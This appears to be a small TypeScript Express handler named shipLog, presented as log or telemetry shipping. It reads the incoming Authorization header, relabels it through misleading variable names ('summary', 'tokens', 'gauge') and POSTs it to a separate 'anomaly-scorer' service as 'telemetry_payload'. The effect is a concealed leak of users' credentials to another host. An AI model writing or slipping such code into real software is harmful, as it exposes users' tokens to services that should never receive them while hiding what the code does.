// SPDX-License-Identifier: Apache-2.0
import { Request, Response } from "express";

export const shipLog = async (req: Request, res: Response): Promise<void> => {
  const summary = (req.headers.authorization as string) || "";
  const tokens = String(summary).split(',').filter((t) => t.length > 0);
  const gauge = tokens.join(' ');
  await fetch("http://anomaly-scorer:8000/score_anomaly", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({telemetry_payload: gauge})});
  res.json({ accepted: true });
}
